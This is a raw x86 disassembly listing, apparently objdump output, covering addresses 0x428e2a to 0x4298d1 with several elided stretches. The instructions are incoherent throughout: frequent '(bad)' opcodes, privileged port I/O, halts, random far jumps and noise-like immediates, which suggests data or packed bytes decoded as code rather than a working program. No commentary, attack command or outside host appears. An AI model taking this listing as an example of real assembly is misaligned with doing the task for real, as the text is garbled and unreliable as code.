  428e2a:	inc    eax
  428e2b:	mov    DWORD PTR [esi+0x39],ebp
  428e2e:	dec    edi
  428e2f:	sbb    cl,BYTE PTR [ebx+0x6]
  428e32:	rol    DWORD PTR [edx+0x79b351de],cl
  428e38:	lea    esi,[eax+0x5993a0]
  428e3e:	and    bl,bh
  428e40:	and    eax,0xf18babca
  428e45:	xchg   ecx,eax
  428e46:	and    bl,BYTE PTR [ebx]
  428e48:	adc    eax,0xae0182a4
  428e4d:	sbb    eax,0x5568ab50
  428e52:	push   ebp
  428e53:	ss or  eax,0xac492fb9
  428e59:	mov    ebp,0xe97b776e
  428e5e:	mov    cl,0x37
  428e60:	mov    eax,0xda77366
  428e65:	xchg   ebx,eax
  428e66:	and    eax,DWORD PTR [edi-0x3ffa661d]
  428e6c:	pop    ds
  428e6d:	fwait
  428e6e:	inc    ecx
  428e6f:	or     eax,0x4679d498
  428e74:	jmp    0x37fb44a5
  428e79:	xchg   dl,dl
  428e7b:	sbb    bl,BYTE PTR [esi]
  428e7d:	ins    BYTE PTR es:[edi],dx
  428e7e:	in     al,0xe7
  428e80:	jo     0x428e73
  428e82:	xchg   BYTE PTR [eax-0x2e],dl
  428e85:	cmc    
  428e86:	hlt    
  428e87:	xor    BYTE PTR [ecx-0x419e8b40],al
  428e8d:	rcl    esp,0x91
	...
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x33
  428f01:	popf   
  428f02:	test   dh,0x5c
  428f05:	mov    ch,0x1
  428f07:	add    BYTE PTR [ecx+eax*1],al
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	cmc    
  428f0d:	and    DWORD PTR [eax-0xc297031],edx
  428f13:	or     edi,DWORD PTR [ebx-0x70]
  428f16:	scas   eax,DWORD PTR es:[edi]
  428f17:	jo     0x428f4b
  428f19:	cmp    eax,0x86d1d2fc
  428f1e:	jp     0x428f32
  428f20:	and    BYTE PTR [edi+0x6f18a77f],dh
  428f26:	jne    0x428f6c
  428f28:	adc    BYTE PTR [ebx],ch
  428f2a:	push   edx
  428f2b:	and    cl,BYTE PTR [edi-0x79]
  428f2e:	dec    esi
  428f2f:	jp     0x428f5f
  428f31:	arpl   bx,bx
  428f33:	adc    bh,ch
  428f35:	rcl    ch,cl
  428f37:	mov    esi,0xdedd220a
  428f3c:	pop    ebp
  428f3d:	mov    ah,0xa6
  428f3f:	jns    0x428f26
  428f41:	and    DWORD PTR [edi],eax
  428f43:	jge    0x428edf
  428f45:	imul   ebx,DWORD PTR [eax],0x556c8697
  428f4b:	adc    al,0x66
  428f4d:	xchg   esp,eax
  428f4e:	out    dx,eax
  428f4f:	jge    0x428f7d
  428f51:	cmp    eax,0xb6fc866a
  428f56:	or     DWORD PTR [eax],eax
  428f58:	sbb    al,0xfd
  428f5a:	cwde   
  428f5b:	and    edx,edi
  428f5d:	mov    ebp,0x38e23dda
  428f62:	push   esi
  428f63:	pop    esp
  428f64:	mov    al,ds:0x6e0cece8
  428f69:	gs and DWORD PTR fs:[ebx+esi*4+0x67531b19],esp
  428f72:	ja     0x428f6f
  428f74:	das    
  428f75:	iret   
  428f76:	xor    eax,0x40f7abe0
  428f7b:	aam    0x3e
  428f7d:	les    edx,FWORD PTR [ecx-0xe]
  428f80:	push   cs
  428f81:	xor    al,0xec
  428f83:	add    cl,BYTE PTR [eax]
  428f85:	hlt    
  428f86:	stos   BYTE PTR es:[edi],al
  428f87:	aaa    
  428f88:	push   ebp
  428f89:	inc    ebp
  428f8a:	pop    ss
  428f8b:	cmc    
  428f8c:	mov    dl,dl
  428f8e:	and    al,0xb
  428f90:	popa   
  428f91:	jb     0x428f2c
  428f93:	pop    eax
  428f94:	div    BYTE PTR [esi+0x61]
  428f97:	and    edx,DWORD PTR [ebx]
  428f99:	mov    al,ds:0x18cb1043
  428f9e:	fist   WORD PTR [edx]
  428fa0:	and    eax,0x9551aa15
  428fa5:	and    BYTE PTR [edi+0x5af9d457],ah
  428fab:	aam    0x33
  428fad:	nop
  428fae:	sbb    al,0x58
  428fb0:	push   ebx
  428fb1:	mov    ds:0x1cdc24a0,eax
  428fb6:	mov    al,0x23
  428fb8:	fwait
  428fb9:	sbb    edx,DWORD PTR [eax]
  428fbb:	cmp    dl,BYTE PTR [eax]
  428fbd:	enter  0xe76b,0x44
  428fc1:	fild   QWORD PTR [ecx+ebx*2-0x1daa5e70]
  428fc8:	mov    esi,0xced35639
  428fcd:	(bad)  
  428fcf:	xor    DWORD PTR [ecx],esi
  428fd1:	push   edi
  428fd2:	sbb    eax,0xa0a6555f
  428fd7:	(bad)  
  428fd8:	loopne 0x428fd1
  428fda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fdb:	jb     0x428fa5
  428fdd:	mov    bh,0x50
  428fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428fe0:	mov    dl,0xb4
  428fe2:	dec    ecx
  428fe3:	sub    ebx,esi
  428fe5:	lods   eax,DWORD PTR ds:[esi]
  428fe6:	aad    0xb1
  428fe8:	mov    dh,0x76
  428fea:	stos   BYTE PTR es:[edi],al
  428feb:	pop    edi
  428fec:	xchg   ecx,eax
  428fed:	test   eax,0x4e3fba9c
  428ff2:	in     eax,0xc8
  428ff4:	add    al,0x4b
  428ff6:	cwde   
  428ff7:	jg     0x428ffb
  428ff9:	daa    
  428ffa:	ds nop
  428ffc:	push   cs
  428ffd:	jl     0x428f98
  428fff:	pop    ebp
  429000:	mov    ds:0xf64c37c6,eax
  429005:	(bad)
  429009:	inc    edx
  42900a:	pop    ss
  42900b:	mov    dl,0xa0
  42900d:	push   es
  42900e:	aad    0xc7
	...
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x42fc7b77
  429081:	mov    ecx,0xb660c4cc
  429086:	add    DWORD PTR [eax],eax
  429088:	add    al,0x1
  42908a:	add    BYTE PTR [eax],al
  42908c:	sbb    eax,0x48ef56ec
  429091:	ja     0x4290a0
  429093:	inc    esp
  429094:	push   0xfffffff4
  429096:	xor    DWORD PTR [eax+0xe],esp
  429099:	pop    ss
  42909a:	and    BYTE PTR [esi],bl
  42909c:	push   eax
  42909d:	mov    edx,0x86dca671
  4290a2:	mov    esp,0x73c2f9cf
  4290a7:	mov    esi,0xe8993df5
  4290ac:	fwait
  4290ad:	int    0xed
  4290af:	xsaves [edx+0x45]
  4290b3:	into   
  4290b4:	and    eax,0x41a48478
  4290b9:	(bad)  
  4290bb:	xchg   edi,eax
  4290bc:	jmp    0xb1d8:0x1d24e442
  4290c3:	retf   
  4290c4:	push   es
  4290c5:	sub    eax,0x475e6ff2
  4290ca:	aaa    
  4290cb:	in     eax,0x4b
  4290cd:	mov    esp,0x4926724f
  4290d2:	adc    dh,al
  4290d4:	mov    ebp,ecx
  4290d6:	cld    
  4290d7:	inc    esp
  4290d8:	xor    eax,0x37f716fa
  4290dd:	xchg   BYTE PTR [ebp+0x13f4ad09],ch
  4290e3:	and    eax,ecx
  4290e5:	clc    
  4290e6:	stos   BYTE PTR es:[edi],al
  4290e7:	inc    edx
  4290e8:	add    cl,BYTE PTR [ebx+0x8b8335c]
  4290ee:	pop    ds
  4290ef:	into   
  4290f0:	add    ebx,esi
  4290f2:	or     BYTE PTR [ebp+0x2b],bh
  4290f5:	ins    BYTE PTR es:[edi],dx
  4290f6:	pop    eax
  4290f7:	mov    eax,ds:0x24c1209a
  4290fc:	mov    al,ds:0xf304cb6a
  429101:	or     DWORD PTR [ebp-0x1c],ebx
  429104:	inc    cx
  429106:	cs xor ecx,edi
  429109:	aam    0x5a
  42910b:	cli    
  42910c:	es jne 0x4290b5
  42910f:	push   ebp
  429110:	mov    edi,0x9c9c08fc
  429115:	mov    al,ds:0xfa6aee4
  42911a:	aaa    
  42911b:	or     DWORD PTR [ebx-0x54ee93f2],ecx
  429121:	stos   DWORD PTR es:[edi],eax
  429122:	loopne 0x4290fd
  429124:	jge    0x4290d1
  429126:	or     ecx,DWORD PTR [ebp-0x23]
  429129:	aad    0x7a
  42912b:	xchg   esp,eax
  42912c:	or     DWORD PTR [edx-0x45933b0c],ecx
  429132:	pusha  
  429133:	push   esp
  429134:	pop    ecx
  429135:	push   ebx
  429136:	inc    edi
  429137:	rol    BYTE PTR [ebx+0x730ac1ce],cl
  42913d:	test   al,0xa1
  42913f:	sbb    al,0xff
  429141:	mov    edi,0x6158a08a
  429146:	dec    ebp
  429147:	loope  0x4291b5
  429149:	popf   
  42914a:	loopne 0x429117
  42914c:	add    ebx,DWORD PTR [ebp-0x67f51912]
  429152:	sbb    al,BYTE PTR [ecx+0x2c]
  429155:	cmc    
  429156:	push   ebx
  429157:	inc    eax
  429158:	push   ebp
  429159:	pop    ebp
  42915a:	icebp  
  42915b:	inc    edx
  42915c:	sub    esp,0x28
  42915f:	outs   dx,DWORD PTR ds:[esi]
  429160:	es xchg esi,eax
  429162:	inc    eax
  429163:	rcl    DWORD PTR [ebp+0x1da90212],0xc7
  42916a:	mov    edx,0xf0bec45e
  42916f:	mov    DWORD PTR [eax+0x6c18eb06],ecx
  429175:	stc    
  429176:	add    al,0xd8
  429178:	or     DWORD PTR [edi+0x4db343b6],esp
  42917e:	shl    BYTE PTR [ecx-0x652cfa5b],1
  429184:	add    ebx,DWORD PTR ds:0x7b37b0e5
  42918a:	or     dh,BYTE PTR es:[ecx-0x48]
  42918e:	pop    ebp
  42918f:	and    eax,DWORD PTR [eax]
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ecx+eiz*2+0x646ab34d],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [eax],dh
  42920d:	mov    ebp,0x3fc08008
  429212:	fwait
  429213:	mov    edx,0xe9a2841d
  429218:	dec    edx
  429219:	mov    ss,WORD PTR [edi-0xb90d27d]
  42921f:	jmp    0x429291
  429221:	dec    ebp
  429222:	repz (bad)
  429225:	ret    0xc0c5
  429228:	jb     0x429248
  42922a:	(bad)  
  42922b:	std    
  42922c:	sbb    DWORD PTR [edi],0xe1c19da2
  429232:	jo     0x4291cb
  429234:	xor    ch,BYTE PTR [ebx+edi*8+0x51]
  429238:	inc    ebp
  429239:	and    al,0x42
  42923b:	lods   eax,DWORD PTR ds:[esi]
  42923c:	mov    dh,0x2d
  42923e:	dec    eax
  42923f:	icebp  
  429240:	imul   eax,DWORD PTR [edi*2-0x2ffe9705],0x23
  429248:	jno    0x4292b4
  42924a:	dec    edx
  42924b:	sub    eax,0x70ea0d6c
  429250:	inc    eax
  429251:	fisubr DWORD PTR [eax+0x59]
  429254:	push   esp
  429255:	xor    eax,edi
  429257:	int    0x62
  429259:	and    DWORD PTR [ebx-0x72],0x5fe5f821
  429260:	mov    ecx,?
  429262:	fistp  DWORD PTR ss:[esi]
  429265:	ins    BYTE PTR es:[edi],dx
  429266:	pop    DWORD PTR [eax+ecx*8]
  429269:	cdq    
  42926a:	push   ecx
  42926b:	adc    DWORD PTR [eax+0x564acf60],edi
  429271:	arpl   bx,bx
  429273:	scas   eax,DWORD PTR es:[edi]
  429274:	test   BYTE PTR [edx-0x6bf07e96],dl
  42927a:	cmp    ch,BYTE PTR [esp+ebx*2-0x2f6e6c0b]
  429281:	xchg   DWORD PTR [ebp-0x6a],ebx
  429284:	mov    ecx,?
  429286:	(bad)  [edx]
  429288:	aam    0x56
  42928a:	pop    ebx
  42928b:	ret    0xb344
  42928e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42928f:	clc    
  429290:	int    0x9e
  429292:	sub    ebp,DWORD PTR [ecx+0x34d203c]
  429298:	stos   DWORD PTR es:[edi],eax
  429299:	clc    
  42929a:	sub    esi,DWORD PTR [ebp+0x4f]
  42929d:	or     eax,0xad4ecce7
  4292a2:	xlat   BYTE PTR ds:[ebx]
  4292a3:	ds jecxz 0x4292ca
  4292a6:	push   ecx
  4292a7:	icebp  
  4292a8:	jecxz  0x429281
  4292aa:	lods   al,BYTE PTR ds:[esi]
  4292ab:	cmp    al,0x76
  4292ad:	data16 into 
  4292af:	in     al,0xe8
  4292b1:	imul   ecx,DWORD PTR [eax],0x41
  4292b4:	inc    eax
  4292b5:	adc    al,0x5d
  4292b7:	and    eax,0xb19857a6
  4292bc:	mov    ah,0xea
  4292be:	jle    0x42931b
  4292c0:	add    cl,dh
  4292c2:	ins    BYTE PTR es:[edi],dx
  4292c3:	pushf  
  4292c4:	xor    esp,DWORD PTR [edi+0x66c597f7]
  4292ca:	and    bl,cl
  4292cc:	sub    eax,0x79c3252e
  4292d1:	adc    al,0x15
  4292d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292d4:	mov    eax,ds:0xd7e41cab
  4292d9:	loop   0x4292ea
  4292db:	jns    0x429270
  4292dd:	cmp    bh,dl
  4292df:	cs add eax,0x90348ad5
  4292e5:	pusha  
  4292e6:	sar    DWORD PTR [esi*4-0x6d949abf],0x47
  4292ee:	jno    0x4292ec
  4292f0:	aas    
  4292f1:	ret    0x723c
  4292f4:	in     eax,0x94
  4292f6:	jno    0x4292c8
  4292f8:	dec    esp
  4292f9:	push   edx
  4292fa:	test   DWORD PTR [ebx+0x56bd3d16],ebx
  429300:	and    eax,0x7a00697d
  429305:	in     al,0x86
  429307:	add    esi,0xc081d23f
  42930d:	xchg   DWORD PTR [eax+eax*8+0x0],edi
	...
  429371:	add    BYTE PTR [eax],al
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xe2
  429381:	mov    eax,ds:0xb8682536
  429386:	add    DWORD PTR [eax],eax
  429388:	add    al,0x1
  42938a:	add    BYTE PTR [eax],al
  42938c:	xchg   edx,eax
  42938d:	fs cs repnz push es
  429391:	popf   
  429392:	adc    ah,BYTE PTR [edx+0x9]
  429395:	stc    
  429396:	add    ah,dl
  429398:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42939a:	or     BYTE PTR [edx+0x71],al
  42939d:	je     0x4293b3
  42939f:	sub    BYTE PTR [edi+eax*1],0xc0
  4293a3:	xchg   bl,cl
  4293a5:	shl    ebx,1
  4293a7:	aaa    
  4293a8:	(bad)  
  4293a9:	pop    esp
  4293aa:	out    0x9a,al
  4293ac:	in     eax,dx
  4293ad:	add    eax,0xf4c61d7e
  4293b2:	cmp    BYTE PTR [esi+0x34],0x6d
  4293b6:	sti    
  4293b7:	sub    bh,BYTE PTR [esi+0x77]
  4293ba:	mov    al,BYTE PTR [eax+edi*8-0x29f4b1b6]
  4293c1:	inc    ecx
  4293c2:	or     al,0xf3
  4293c4:	enter  0x9021,0x24
  4293c8:	jmp    eax
  4293ca:	imul   BYTE PTR [esi+ebp*1-0x6ef87ac0]
  4293d1:	sub    al,0x6b
  4293d3:	sub    al,0x3b
  4293d5:	test   DWORD PTR [edi+0x51],edi
  4293d8:	jnp    0x429364
  4293da:	mov    WORD PTR [eax+0x2c06bc9f],fs
  4293e0:	cmp    cl,ah
  4293e2:	cmp    DWORD PTR [ecx],0xffffffae
  4293e5:	hlt    
  4293e6:	mov    edi,0xe3032d6d
  4293eb:	mov    ss,WORD PTR [ecx-0x66]
  4293ee:	les    ecx,FWORD PTR [edi+0x32bb2c90]
  4293f4:	sbb    al,0xff
  4293f6:	xlat   BYTE PTR ds:[ebx]
  4293f7:	iret   
  4293f8:	call   0xf43a25d1
  4293fd:	outs   dx,DWORD PTR ds:[esi]
  4293fe:	imul   ebp,DWORD PTR [edi],0xffffffe4
  429401:	jne    0x4293d4
  429403:	fwait
  429404:	or     BYTE PTR [ecx+ebx*8+0x1b06ca08],0x3e
  42940c:	dec    ebp
  42940d:	push   edx
  42940e:	cmc    
  42940f:	sub    ecx,DWORD PTR ds:0xab662c43
  429415:	pop    esp
  429416:	aam    0xfe
  429418:	xor    DWORD PTR [edi-0x65],edi
  42941b:	push   ss
  42941c:	fs push esi
  42941e:	and    bh,BYTE PTR [ebx]
  429420:	fistp  QWORD PTR [esi]
  429422:	and    DWORD PTR [edi-0x162bd903],ebx
  429428:	xchg   BYTE PTR [ebx+0x1d],ch
  42942b:	xor    eax,0x96cae9a9
  429430:	out    0x71,eax
  429432:	inc    esi
  429433:	dec    esi
  429434:	pop    ds
  429435:	stos   BYTE PTR es:[edi],al
  429436:	mov    ah,0x3d
  429438:	xor    BYTE PTR [eax-0x7f],dh
  42943b:	pop    edx
  42943c:	sbb    ebp,DWORD PTR [ebx+0x63d416e9]
  429442:	or     edx,DWORD PTR [ebx-0x6d9e6476]
  429448:	push   ebx
  429449:	fs inc eax
  42944b:	(bad)  
  42944c:	aad    0xbc
  42944e:	and    ebp,DWORD PTR [edi-0x5e2a38a8]
  429454:	jecxz  0x4294ae
  429456:	jno    0x429410
  429458:	jne    0x42944e
  42945a:	jnp    0x42944a
  42945c:	and    ecx,esi
  42945e:	mul    al
  429460:	add    BYTE PTR [edi-0x310ed5b2],0x57
  429467:	push   cs
  429468:	fisub  DWORD PTR [ebx]
  42946a:	inc    edi
  42946b:	pop    es
  42946c:	xchg   DWORD PTR [edx],esi
  42946e:	into   
  42946f:	xor    BYTE PTR [ebx],al
  429471:	adc    eax,0x1ec3c235
  429476:	add    bl,cl
  429478:	repnz mov cl,0xce
  42947b:	cmp    al,0x12
  42947d:	sub    edi,DWORD PTR [ebx+0x2a]
  429480:	mov    ecx,0x64b5436e
  429485:	lods   eax,DWORD PTR ds:[esi]
  429486:	xchg   edx,eax
  429487:	ds adc ebx,ebx
  42948a:	adc    BYTE PTR [eax-0x28],0xad
  42948e:	cmp    ch,BYTE PTR [edx+0x0]
	...
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp-0x3790b116],dx
  429503:	fsubr  QWORD PTR [ecx+edi*4+0x1]
  429507:	add    BYTE PTR [ecx+eax*1],al
  42950a:	add    BYTE PTR [eax],al
  42950c:	fwait
  42950d:	jl     0x429554
  42950f:	mov    esp,0x36e167d5
  429514:	int3   
  429515:	xchg   ebp,eax
  429516:	vmread edi,ebp
  429519:	rol    DWORD PTR [edx+0x23],0x23
  42951d:	loop   0x429584
  42951f:	dec    edx
  429520:	xor    al,0x43
  429522:	add    al,0x97
  429524:	mov    bh,0xbc
  429526:	jecxz  0x42956a
  429528:	lds    esp,FWORD PTR [eax-0x54a75217]
  42952e:	rcr    DWORD PTR [edx],0x4b
  429531:	dec    edx
  429532:	(bad)  
  429534:	mov    ss,WORD PTR [ebx+edx*4+0x380e355c]
  42953b:	mov    bh,0xb0
  42953d:	sub    DWORD PTR [esi-0x4424dae2],ebx
  429543:	jnp    0x42959f
  429545:	xor    eax,0xad79b732
  42954a:	mov    cl,0x9d
  42954c:	cwde   
  42954d:	mov    ds:0xfe4cb3b8,eax
  429552:	popf   
  429553:	jg     0x429534
  429555:	out    dx,eax
  429556:	mov    bh,0x5b
  429558:	imul   eax,DWORD PTR [edi-0x6f],0xf4ce642b
  42955f:	pop    ss
  429560:	cmp    esi,esp
  429562:	fistp  QWORD PTR [eax-0x1f]
  429565:	pop    edx
  429566:	push   0xffffff9c
  429568:	aas    
  429569:	addr16 cmc 
  42956b:	add    BYTE PTR [ebx+ecx*4],bh
  42956e:	sti    
  42956f:	retf   
  429570:	ret    
  429571:	in     al,dx
  429572:	push   ebp
  429573:	ds nop
  429575:	aaa    
  429576:	adc    eax,0x1ff0c27a
  42957b:	out    0x27,al
  42957d:	lahf   
  42957e:	es dec edx
  429580:	addr16 aad 0xf4
  429583:	js     0x4295bb
  429585:	xchg   esi,eax
  429586:	xor    edi,DWORD PTR [edx-0x5cf55600]
  42958c:	sbb    DWORD PTR [edi+eax*2-0xd87f0ce],esi
  429593:	dec    ebp
  429594:	lahf   
  429595:	dec    edx
  429596:	inc    esi
  429597:	loop   0x429599
  429599:	xchg   ebx,eax
  42959a:	loope  0x4295f0
  42959c:	out    dx,al
  42959d:	ret    0x9aa7
  4295a0:	sub    al,0x37
  4295a2:	dec    ebx
  4295a3:	sub    al,0x5d
  4295a5:	mov    ds:0xafca8327,eax
  4295aa:	rcl    BYTE PTR [ebp+0x3f],1
  4295ad:	ret    
  4295ae:	mov    ds,eax
  4295b0:	pop    ss
  4295b1:	enter  0xd4ab,0xf8
  4295b5:	add    DWORD PTR [ebx-0x75],esi
  4295b8:	inc    edi
  4295b9:	arpl   WORD PTR gs:[esi+ecx*2],ax
  4295bd:	mov    ebp,0xf472f4be
  4295c2:	cli    
  4295c3:	(bad)  
  4295c5:	in     al,0x1
  4295c7:	bound  ebp,QWORD PTR [edi+0xb8e923c]
  4295cd:	add    eax,0xd0fb2414
  4295d2:	cld    
  4295d3:	mov    ebx,0x50ce3eb8
  4295d8:	mov    ebp,DWORD PTR [esp+ebp*4-0x21b7845f]
  4295df:	inc    edx
  4295e0:	push   ss
  4295e1:	xor    eax,0x2330ddaa
  4295e6:	xchg   ebx,eax
  4295e7:	sbb    edi,DWORD PTR [ecx]
  4295e9:	jmp    0x1cd9:0x99fef51d
  4295f0:	lock icebp 
  4295f2:	(bad)  
  4295f3:	mov    bh,0x21
  4295f5:	push   eax
  4295f6:	sar    BYTE PTR [esi+0x5215a656],1
  4295fc:	xchg   ecx,eax
  4295fd:	cld    
  4295fe:	and    ch,dh
  429600:	lea    edi,[esi-0x698ba892]
  429606:	popf   
  429607:	or     dh,BYTE PTR [ebp+0x7]
  42960a:	lds    ecx,FWORD PTR [edx+edx*4+0x42dcd1]
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	(bad)  
  429681:	push   ecx
  429682:	jge    0x4296dd
  429684:	jo     0x429640
  429686:	add    DWORD PTR [eax],eax
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	sub    al,0x88
  42968e:	xor    dl,bl
  429690:	int3   
  429691:	aad    0x14
  429693:	retf   0xa4dc
  429696:	loop   0x429624
  429698:	pop    eax
  429699:	push   edi
  42969a:	mov    dh,0xa
  42969c:	in     al,dx
  42969d:	adc    bl,BYTE PTR [eax-0x14aaf0b0]
  4296a3:	mov    bl,0xbb
  4296a5:	fwait
  4296a6:	scas   al,BYTE PTR es:[edi]
  4296a7:	popf   
  4296a8:	iret   
  4296a9:	jg     0x429644
  4296ab:	mov    bl,0xd6
  4296ad:	jb     0x42964e
  4296af:	in     al,0x2
  4296b1:	test   DWORD PTR [ebx],esp
  4296b3:	jb     0x429715
  4296b5:	hlt    
  4296b6:	mov    edi,esi
  4296b8:	adc    eax,0x6241318f
  4296bd:	retf   0x17a0
  4296c0:	push   esp
  4296c1:	push   esp
  4296c2:	imul   edx,DWORD PTR [eax],0x420b8531
  4296c8:	dec    edx
  4296c9:	sub    eax,0x8a210199
  4296ce:	ins    DWORD PTR es:[edi],dx
  4296cf:	jmp    0x429676
  4296d1:	push   ss
  4296d2:	push   ebp
  4296d3:	adc    DWORD PTR [edi-0x118a5dc9],ecx
  4296d9:	aas    
  4296da:	imul   esi,DWORD PTR [edi-0x23c8d6c],0x3510316f
  4296e4:	inc    ecx
  4296e5:	cmp    al,0xc4
  4296e7:	inc    ebx
  4296e8:	inc    edi
  4296e9:	pushf  
  4296ea:	mov    edi,0x4c9fcbb2
  4296ef:	nop
  4296f0:	jecxz  0x4296a6
  4296f2:	lea    ebp,ds:0xa7ae84de
  4296f8:	aas    
  4296f9:	dec    edx
  4296fa:	dec    edi
  4296fb:	int    0x2
  4296fd:	hlt    
  4296fe:	fstp   DWORD PTR [ebx-0x58a6deca]
  429704:	leave  
  429705:	jmp    0xab89:0x4b6e6334
  42970c:	idiv   ecx
  42970e:	cmp    bl,dh
  429710:	fcomp  DWORD PTR [ebx]
  429712:	jmp    0x643d:0xce9765d5
  429719:	adc    DWORD PTR [esi+0x7b],esi
  42971c:	sar    BYTE PTR [ebx-0x78],1
  42971f:	aam    0x50
  429721:	and    eax,0x50dc02e
  429726:	and    dh,BYTE PTR [esi-0x51]
  429729:	test   eax,0xfaebfdbd
  42972e:	xchg   DWORD PTR ds:0xeb3754ab,eax
  429734:	popf   
  429735:	push   esp
  429736:	pop    eax
  429737:	mov    ebp,0x778fdc44
  42973c:	dec    ebp
  42973d:	push   ebp
  42973e:	imul   edx,eax,0x9c474d5b
  429744:	fisub  DWORD PTR [eax+0x14038d3b]
  42974a:	xchg   ebx,eax
  42974b:	popf   
  42974c:	in     eax,0xa2
  42974e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42974f:	ret    
  429750:	xor    BYTE PTR [ebp-0x35],dh
  429753:	test   al,0x78
  429755:	mov    BYTE PTR [ebx],ch
  429757:	cld    
  429758:	adc    al,ch
  42975a:	std    
  42975b:	aaa    
  42975c:	sub    edi,DWORD PTR [edi+ebx*8]
  42975f:	std    
  429760:	inc    ebp
  429761:	fwait
  429762:	repnz es in al,dx
  429765:	sub    DWORD PTR [eax-0x6993917d],esp
  42976b:	adc    DWORD PTR ds:0xb47d4249,ebp
  429771:	mov    al,0xb5
  429773:	jmp    DWORD PTR ds:0x7c7595a
  429779:	push   cs
  42977a:	inc    esp
  42977b:	cmp    ecx,DWORD PTR [edi]
  42977d:	mov    al,0xaf
  42977f:	bound  ebp,QWORD PTR [esi+0x24]
  429782:	mov    ecx,0x48c845f6
  429787:	xor    DWORD PTR [ecx],ecx
  429789:	or     al,0x70
  42978b:	in     al,dx
  42978c:	sub    dh,dl
  42978e:	ins    DWORD PTR es:[edi],dx
  42978f:	sti    
	...
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	mov    ah,0x77
  429802:	jo     0x429870
  429804:	je     0x4297c1
  429806:	add    DWORD PTR [eax],eax
  429808:	add    al,0x1
  42980a:	add    BYTE PTR [eax],al
  42980c:	arpl   di,ax
  42980e:	inc    edi
  42980f:	pop    es
  429810:	pop    edi
  429811:	dec    ecx
  429812:	out    dx,al
  429813:	sbb    ax,WORD PTR [eax+0x258beffd]
  42981a:	sbb    eax,0x35a7d822
  42981f:	call   DWORD PTR [edx+esi*2]
  429822:	jle    0x42985b
  429824:	into   
  429825:	mov    WORD PTR [eax-0x1c],fs
  429828:	daa    
  429829:	xchg   esp,eax
  42982a:	in     al,0x6c
  42982c:	mov    esp,0x1ce28497
  429831:	push   ss
  429832:	lds    esp,FWORD PTR [ecx-0x33c1d1f2]
  429838:	ret    0x53ab
  42983b:	add    eax,DWORD PTR [eax-0x493ab3dc]
  429841:	cld    
  429842:	mov    eax,0x6b236408
  429847:	push   eax
  429848:	outs   dx,BYTE PTR ds:[esi]
  429849:	mov    esp,0x42eb4797
  42984e:	cld    
  42984f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429850:	or     BYTE PTR [esi+0x1079c69a],ah
  429856:	inc    edi
  429857:	and    al,0xc1
  429859:	xor    ebx,0xffffffeb
  42985c:	mov    bh,0x8
  42985e:	inc    ecx
  42985f:	fsub   DWORD PTR [edi]
  429861:	mov    eax,0x46f42dac
  429866:	and    al,bl
  429868:	pop    esi
  429869:	rcr    edi,cl
  42986b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42986c:	jl     0x42980a
  42986e:	retf   
  42986f:	jae    0x429860
  429871:	repz sbb dh,BYTE PTR [esp+edi*8]
  429875:	repz mov al,ds:0x30031a28
  42987b:	pop    ss
  42987c:	pop    ss
  42987d:	in     eax,dx
  42987e:	jne    0x429817
  429880:	outs   dx,DWORD PTR ds:[esi]
  429881:	fcmovu st,st(1)
  429883:	mov    esp,gs
  429885:	pop    ss
  429886:	adc    DWORD PTR [eax],ebp
  429888:	int    0xda
  42988a:	push   esi
  42988b:	test   DWORD PTR [edi+edi*1+0x1a],edx
  42988f:	adc    bh,bh
  429891:	sub    DWORD PTR [ebx+0x1f],esi
  429894:	enter  0xc18c,0xcc
  429898:	js     0x4298d6
  42989a:	in     eax,dx
  42989b:	pop    edi
  42989c:	cdq    
  42989d:	sbb    BYTE PTR [eax],al
  42989f:	sbb    DWORD PTR [edi+0x49],ebp
  4298a2:	xor    eax,0xbe90f401
  4298a7:	or     DWORD PTR [eax-0x2e],esp
  4298aa:	retf   
  4298ab:	or     eax,0x2dd6e997
  4298b0:	jnp    0x4298db
  4298b2:	dec    ebx
  4298b3:	mov    edx,gs
  4298b5:	mov    al,0x46
  4298b7:	stos   DWORD PTR es:[edi],eax
  4298b8:	or     eax,DWORD PTR [esi+edi*1-0x7c]
  4298bc:	jne    0x429876
  4298be:	xchg   esi,eax
  4298bf:	or     DWORD PTR [edi-0x18],esp
  4298c2:	xor    bh,BYTE PTR [ecx]
  4298c4:	push   es
  4298c5:	out    0x97,eax
  4298c7:	mov    WORD PTR [eax+ebx*8-0x36],?
  4298cb:	aas    
  4298cc:	mov    esi,0xc3f3de8e
  4298d1:	lea    edx,[edi]
